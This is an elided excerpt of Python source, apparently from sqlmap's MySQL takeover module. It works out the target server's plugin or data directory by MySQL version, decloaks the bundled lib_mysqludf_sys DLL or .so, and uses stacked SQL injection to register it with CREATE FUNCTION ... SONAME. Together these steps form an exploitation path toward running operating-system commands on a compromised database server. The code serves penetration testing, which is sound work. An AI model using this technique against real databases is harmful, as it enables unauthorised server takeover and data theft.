...
class Takeover(GenericTakeover):
    ...
    def udfSetRemotePath(self):
        ...
        if banVer >= "5.0.67":
            ...
            if self.__plugindir is None and banVer >= "5.1.19":
                ...
                # Reference:
                # http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
                ...
                # The DLL must be in C:\Program Files\MySQL\MySQL Server
                # 5.1\lib\plugin
            ...
            self.__plugindir = ntToPosixSlashes(
                normalizePath(self.__plugindir)) or '.'

            self.udfRemoteFile = "%s/%s.%s" % (self.__plugindir,
        ...
        # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir
        # set in my.ini configuration file
        else:
            ...
            self.udfRemoteFile = "%s/%s.%s" % (self.__datadir,
                                               self.udfSharedLibName, self.udfSharedLibExt)
    ...
    def udfSetLocalPaths(self):
        ...
        if Backend.isOs(OS.WINDOWS):
            _ = os.path.join(
                self.udfLocalFile, "mysql", "windows", "%d" %
                Backend.getArch(), "lib_mysqludf_sys.dll_")
            self.udfLocalFile = decloakToTemp(_)
            self.udfSharedLibExt = "dll"
        else:
            _ = os.path.join(
                self.udfLocalFile, "mysql", "linux", "%d" %
                Backend.getArch(), "lib_mysqludf_sys.so_")
            self.udfLocalFile = decloakToTemp(_)
    ...
    def udfCreateFromSharedLib(self, udf, inpRet):
        if udf in self.udfToCreate:
            ...
            inject.goStacked(
                "CREATE FUNCTION %s RETURNS %s SONAME '%s.%s'" %
